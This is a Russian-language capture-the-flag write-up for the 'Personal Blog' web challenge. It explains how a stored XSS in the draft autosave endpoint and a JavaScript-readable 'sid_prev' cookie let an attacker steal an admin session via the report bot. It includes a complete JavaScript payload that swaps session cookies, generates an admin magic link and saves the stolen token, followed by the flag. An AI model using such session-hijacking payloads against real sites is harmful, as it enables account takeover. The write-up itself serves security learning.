# Personal Blog — Writeup (Web)



## Кратко
Флаг берётся через цепочку:
1) **Stored XSS** в черновике поста (`/api/autosave` → `/edit/:id`).
2) Бот-админ открывает мой URL из `/report`.
3) При переходе по `/magic/<token>` сервер пишет **предыдущую сессию** в cookie `sid_prev` (и она **доступна JS**).
4) Мой XSS читает `sid_prev` (админский `sid`), временно подменяет `sid`, генерирует **админский** magic-link и сохраняет токен мне обратно.
5) Я захожу по админскому magic-link и открываю `/flag`.

---

## Наблюдения по функционалу
- Есть регистрация/логин.
- Есть редактор поста: `/edit` создаёт новый пост и редиректит на `/edit/<id>`.
- Есть автосейв черновика: `POST /api/autosave` с `{postId, content}`.
- Есть магик-линки: генерация токена и вход по `/magic/<token>`.
- Есть репорт: `/report`, который отправляет ссылку боту (админу).

---

## Уязвимость 1 — Stored XSS в черновике
### Факт
`/api/autosave` принимает `content` и сохраняет его как `draftContent` без достаточной очистки HTML.

На странице редактирования `/edit/:id` черновик вставляется как HTML (в шаблоне используется неэкранированная вставка вида `<%- ... %>`), из-за чего любой HTML/JS из `draftContent` выполняется в браузере.

### Проверка вручную
1) Создать пост `/edit` → получить `postId`.
2) Отправить в `/api/autosave` контент с XSS (например `<img src=x onerror=alert(1)>`).
3) Открыть `/edit/<postId>` и увидеть выполнение JS.

---

## Уязвимость 2 — cookie `sid_prev` раскрывает админскую сессию
### Факт
При открытии `/magic/<token>` сервер:
- сохраняет **текущий** `sid` в `sid_prev`,
- затем ставит новый `sid` для пользователя токена,
- делает редирект на `redirect=...`.

`sid_prev` **не HttpOnly**, значит доступен из JavaScript: `document.cookie`.

---

## Ограничение репорта (важно)
### Факт
`/report` принимает **только локальные URL**. Если отправлять полный URL с IP/доменом, сервер отвечает:
- `Only local URLs are allowed.`

Значит в `/report` нужно передавать **относительный путь**, начинающийся с `/`.

---

## Эксплуатация (вручную, шаги)

### Шаг 1. Зарегистрироваться и создать пост
1) Зарегистрироваться/войти.
2) Открыть `/edit` → получить `postId` из редиректа на `/edit/<postId>`.

### Шаг 2. Сохранить XSS в черновик
Отправить `POST /api/autosave` JSON:
```json
{
  "postId": <postId>,
  "content": "<img src=x onerror=\"...JS...\">"
}
```

JS должен делать следующее:
1) Прочитать `sid` и `sid_prev` из `document.cookie`.
2) Если `sid_prev` есть — это админский sid (после того, как админ зашёл по magic-ссылке и ему сделали redirect).
3) Временно поставить cookie `sid = sid_prev`.
4) Дёрнуть `POST /magic/generate` (уже как админ).
5) Открыть `/account` и вытащить последний `/magic/<32hex>` из HTML.
6) Вернуть `sid` обратно на свой.
7) Сохранить строку `ADMIN_TOKEN:<token>` в мой черновик через `/api/autosave`.

Пример payload (вставляю `postId` руками):
```html
<img src=x onerror="(()=>{ 
  const postId=123; // 

  const get=(n)=>('; '+document.cookie).split('; '+n+'=').pop().split(';')[0];
  const mySid=get('sid');
  const adminSid=get('sid_prev');
  if(!adminSid) return;


  document.cookie='sid='+adminSid+'; path=/';

  fetch('/magic/generate',{method:'POST',credentials:'include'})
    .then(()=>fetch('/account',{credentials:'include'}))
    .then(r=>r.text())
    .then(html=>{
      const ms=[...html.matchAll(/\/magic\/([0-9a-f]{32})/g)].map(m=>m[1]);
      const tok=ms.length?ms[ms.length-1]:'';

      
      document.cookie='sid='+mySid+'; path=/';

      
      return fetch('/api/autosave',{
        method:'POST',
        headers:{'Content-Type':'application/json'},
        credentials:'include',
        body:JSON.stringify({postId:postId,content:'ADMIN_TOKEN:'+tok})
      });
    });
})()">
```

### Шаг 3. Подготовить “триггер” для бота-админа
1) На своём аккаунте сгенерировать магик-линк (через кнопку/страницу генерации, либо эндпоинт, который делает это в UI).
2) Получить **мой** токен `my_token` из `/account` (там есть ссылки вида `/magic/<32hex>`).

### Шаг 4. Отправить ссылку в `/report`
В репорт отправлять **только локальный путь**:

```
/magic/<my_token>?redirect=/edit/<postId>
```

Логика:
- бот (админ) открывает `/magic/<my_token>` → сервер ставит `sid_prev = ADMIN_SID`, `sid = мой sid`,
- затем редирект на `/edit/<postId>`,
- там выполняется мой stored XSS и читает `sid_prev`.

### Шаг 5. Забрать админский токен из своего черновика
После визита бота открыть `/edit/<postId>` и найти строку вида:
```
ADMIN_TOKEN:<32hex>
```

### Шаг 6. Зайти как админ и получить флаг
Открыть:
```
/magic/<ADMIN_TOKEN>?redirect=/flag
```

После этого страница `/flag` отдаёт флаг.

---

FLAG: uoftctf{533M5_l1k3_17_w4snt_50_p3r50n41...}
